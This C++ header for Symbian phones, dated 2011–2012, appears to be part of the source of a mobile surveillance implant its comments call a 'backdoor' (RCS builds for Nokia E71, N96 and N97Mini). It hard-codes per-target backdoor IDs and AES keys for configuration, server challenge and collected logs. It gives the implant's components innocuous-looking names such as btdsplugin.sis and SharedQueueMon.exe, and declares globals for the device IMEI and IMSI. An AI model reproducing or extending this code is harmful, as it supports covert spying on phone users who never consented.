/*
 * Keys.h
 *
 *  Created on: 13/feb/2011
 *      Author: Giovanna
 */

#ifndef KEYS_H_
#define KEYS_H_

#include <e32std.h>
#include <e32base.h>

#define K_KEY_SIZE 16   //TODO: substitute in all places where 16 has been used instead

//_LIT8(KVERSION, "\x1e\x98\xdd\x77");  //2011011102
//_LIT8(KVERSION,"\x25\xea\xdd\x77");  //2011032101
//_LIT8(KVERSION,"\x26\xea\xdd\x77");  //2011032102
//_LIT8(KVERSION,"\x27\xea\xdd\x77");		//2011032103
//_LIT8(KVERSION,"\x35\x5c\xde\x77");		//2011061301
//_LIT8(KVERSION,"\x36\x5c\xde\x77");		//2011061302
//_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
//_LIT8(KVERSION,"\x61\x25\xdf\x77");		//2011112801 7.5
_LIT8(KVERSION,"\x81\x51\xed\x77");  //2012041601  8.0

// KEY Section

_LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");

// Backdoor Id
#ifdef _DEBUG
//_LIT8(KBACKDOORID, "RCS_0000000317\x00\x00");    //backdoor su prod/castore N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000205\x00\x00");    //backdoor su prod N81
//_LIT8(KBACKDOORID, "RCS_0000000028\x00\x00");    //backdoor su preprod/polluce N96
//_LIT8(KBACKDOORID, "RCS_0000000475\x00\x00");    //backdoor su prod E61
//_LIT8(KBACKDOORID, "RCS_0000000453\x00\x00");    //backdoor su prod N97Mini UNINSTALL
//_LIT8(KBACKDOORID, "RCS_0000000135\x00\x00");    //backdoor su prod/castore E72
//_LIT8(KBACKDOORID, "RCS_0000000455\x00\x00");    //backdoor su prod/castore E71
//_LIT8(KBACKDOORID, "RCS_0000000793\x00\x00");    //backdoor su prod/castore E71BaseConf
//_LIT8(KBACKDOORID, "RCS_0000000834\x00\x00");    //backdoor su prod/castore E71AdvConf
_LIT8(KBACKDOORID, "RCS_0000000844\x00\x00");    //backdoor su prod/castore E71TestConf
//_LIT8(KBACKDOORID, "RCS_0000000846\x00\x00");    //backdoor su prod/castore N96AdvConf
//_LIT8(KBACKDOORID, "RCS_0000000125\x00\x00");    //backdoor su prod/castore N96
//_LIT8(KBACKDOORID, "RCS_0000000775\x00\x00");    //backdoor su prod/castore E7-00
#else
_LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
#endif

// ConfKey
#ifdef _DEBUG
//_LIT8(KAES_CONFIG_KEY,"2aea9bec25ee2bfc8b4ab86d24a4d7b8"); //RCS_0000000317  //N97mini prod/castore
//_LIT8(KAES_CONFIG_KEY,"cc2c7eff25615393e1d110194974c511"); //RCS_0000000205  //N81 prod
//_LIT8(KAES_CONFIG_KEY,"5703d7e73a7534c7b9f01d6f960cd575"); //RCS_0000000028  //N96 preprod/polluce
//_LIT8(KAES_CONFIG_KEY,"34e5e13c98d14d2317c4f52c513af286"); //RCS_0000000475  //E61 prod
//_LIT8(KAES_CONFIG_KEY,"28745df4927a0fcca3c40abae83c3881"); //RCS_0000000135  //E72 prod/castore
//_LIT8(KAES_CONFIG_KEY,"7cddcb1b75b6f702a21c4f917ea7c201"); //RCS_0000000455  //E71 prod/castore
//_LIT8(KAES_CONFIG_KEY,"\x7c\xdd\xcb\x1b\x75\xb6\xf7\x02\xa2\x1c\x4f\x91\x7e\xa7\xc2\x01"); //RCS_0000000455  //8.0 E71 castore
//_LIT8(KAES_CONFIG_KEY,"\xfa\x52\x83\xd8\xc9\x25\x5f\x71\xf7\x52\x9a\x4d\x86\x32\xfb\x63"); //RCS_0000000834 E71AdvConf 8.0 castore
_LIT8(KAES_CONFIG_KEY,"\xaa\x4f\xae\x59\x5e\x04\x88\x07\x16\x5c\x73\x0b\x03\x5d\xf5\x2b"); //RCS_0000000844 E71TestConf 8.0 castore
//_LIT8(KAES_CONFIG_KEY,"\xf8\x4d\xbe\xec\x82\x5b\x60\x7b\x86\x8e\x96\x33\x65\x16\xaa\x89"); //RCS_0000000846 N96AdvConf 8.0 castore
//_LIT8(KAES_CONFIG_KEY,"\x7e\x0f\x09\xbe\xd0\x5d\x4f\x0e\xa6\xb7\x59\x4e\xfa\x1d\x4c\xdb\xb6\x10\x15\x8c\xd6\x36\x5c\x47\x0e\x7a\x6b\x6a\xec\x6b\x00\x4a"); //8.0 //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_CONFIG_KEY,"7e0f09bed05d4f0ea6b7594efa1d4cdb"); //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_CONFIG_KEY,"13f49991883eae5ee4c68424e7e5660e"); //RCS_0000000453  //N97mini prod UNINSTALL
//_LIT8(KAES_CONFIG_KEY,"108eef112d3a676be8fb4d26468d6a1d"); //RCS_0000000775  //E7-00 prod/castore
#else
_LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
#endif

//Challenge key or Signature, the same for all bkdoors on the same server
#ifdef _DEBUG
//_LIT8(KAES_CHALLENGE_KEY, "572ebc94391281ccf53a851330bb0d99"); //RCS_0000000317 //N97Mini prod/castore
_LIT8(KAES_CHALLENGE_KEY, "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99"); //Signature 8.0 castore
//_LIT8(KAES_CHALLENGE_KEY, "840da4c68e7dbca9f927de9314e0b586"); //preprod/polluce
#else
_LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
#endif

//Log key
#ifdef _DEBUG
//_LIT8(KAES_LOGS_KEY, "95dac559b0edfffc543b06b46c43e610");  //RCS_0000000317  //N97Mini su prod/castore
//_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81 su prod
//_LIT8(KAES_LOGS_KEY, "3a52790b6627a53da5605aa8b5bc4655");  //RCS_0000000028  //N96 su preprod/polluce
//_LIT8(KAES_LOGS_KEY, "1b50df977cef743ea28f019bde34c727");  //RCS_0000000012  //E61 su prod
//_LIT8(KAES_LOGS_KEY, "d4078fdf640118f158792a39cf70bab4");  //RCS_0000000135  //E72 su prod/castore
//_LIT8(KAES_LOGS_KEY, "597cd89c7e39d395438113da1c879940");  //RCS_0000000455  //E71 su prod/castore
//_LIT8(KAES_LOGS_KEY, "\x59\x7c\xd8\x9c\x7e\x39\xd3\x95\x43\x81\x13\xda\x1c\x87\x99\x40");  //RCS_0000000455  //E71 castore 8.0
//_LIT8(KAES_LOGS_KEY,"\xae\xd1\xd8\x7a\x00\x25\xb0\x23\x7a\x7b\x59\x9c\x96\x6d\x47\x3c"); // RCS_0000000793 E71BaseConf 8.0 castore
//_LIT8(KAES_LOGS_KEY,"\xee\x38\x59\x36\x1b\x7e\x5c\x23\xeb\x32\x4f\xcf\x8d\x42\x76\xb3");  // RCS_0000000834 // E71AdvConf 8.0 su castore
_LIT8(KAES_LOGS_KEY,"\x8a\x5c\xe6\x45\x09\xb0\xc5\xeb\xaf\x12\x40\x72\x17\xda\x3f\xc2");  // RCS_0000000844 // E71TestConf 8.0 su castore
//_LIT8(KAES_LOGS_KEY,"\x24\xcf\x7e\x73\x35\x65\x6b\x1b\x57\x30\x4e\x6b\x8c\x1e\x5b\xce");  // RCS_0000000846 // N96AdvConf 8.0 su castore
//_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 su prod
//_LIT8(KAES_LOGS_KEY, "36cf605bf75fd11edde58b6ec98997e6");  //RCS_0000000453  //N97Mini su prod UNINSTALL
//_LIT8(KAES_LOGS_KEY, "96db502bbee4cd75f09a7aa9d3c6d659");  //RCS_0000000246  //Montalbano
//_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_LOGS_KEY, "\x02\xab\x00\xbe\x97\xa4\x61\xfe\xdf\x9c\xee\xac\xb0\xef\x73\xf3\x68\x99\x2c\xad\x79\xf2\x5c\x8e\x26\xa7\x67\x3b\x7f\xb7\xb9\x40");  //8.0 //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81
//_LIT8(KAES_LOGS_KEY, "05811000a017026f81146343a7106afc");  //RCS_0000000775  //E7-00 prod/castore
#else
_LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
#endif


// UID Section

#ifdef _DEBUG
//_LIT8(KUidBackdoor,"0x20024d7a");   // fake btdsplugin.sis (encapsulates all executables below)
_LIT8(KUidBackdoor,"0x200305D7");   // btdsplugin.sis (encapsulates all executables below)
#else
_LIT8(KUidBackdoor,"0x[:UID1:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidCore,"0x2002aa96");		// fake SharedQueueMon.exe
_LIT8(KUidCore,"0x20030635");		// SharedQueueMon.exe
#else
_LIT8(KUidCore,"0x[:UID2:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidSQSrv,"0x200246be");		// fake SharedQueueSrv.exe  
_LIT8(KUidSQSrv,"0x20030634");		// SharedQueueSrv.exe
#else
_LIT8(KUidSQSrv,"0x[:UID3:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidSQCli,"0x2002b30d");		// fake SharedQueueCli.dll 
_LIT8(KUidSQCli,"0x20030633");		// SharedQueueCli.dll
#else
_LIT8(KUidSQCli,"0x[:UID4:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidUninstaller,"0x20030de3");  // fake Uninstaller.exe and Uninstaller.sis 
_LIT8(KUidUninstaller,"0x200305DB");  // Uninstaller.exe and Uninstaller.sis 
#else
_LIT8(KUidUninstaller,"0x[:UID5:]");
#endif
#ifdef _DEBUG
//_LIT8(KUidMonitor,"0x2000c83e");	  // fake UninstMonitor.exe	
_LIT8(KUidMonitor,"0x200316ED");	  // UninstMonitor.exe	
#else
_LIT8(KUidMonitor,"0x[:UID6:]");
#endif

inline 
TUid GetUid(const TDesC8& aUidBuf)
	{
	TBuf8<12> hexBuf(aUidBuf);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	TUint32 uid;
	lex.Val(uid,EHex);
	TUid kUid = TUid::Uid(uid);
	return kUid;	
	}

/**
KPropertyUidCore
Property reserved for the core
*/
const TUid KPropertyUidCore = GetUid(KUidCore);
/**
KPropertyFreeSpaceThreshold
The key to observe changes in available space on disk.
Will be updated when the threshold is passed: 1=below threshold, 0=above threshold
*/
const TUint KPropertyFreeSpaceThreshold = 2; 
/**
 * KPropertyStopSubactions
 * The key to stop subactions when stop=true into sync params
 * Will be updated during every sync; 1 = stop subactions, 0 = do not stop subactions
 */
const TUint KPropertyStopSubactions = 3;

extern TBuf<50>   	iGlobalImei;
extern TBuf<15>		iGlobalImsi;
extern TBuf8<16>     iSymbianSubtype;

#endif /* KEYS_H_ */
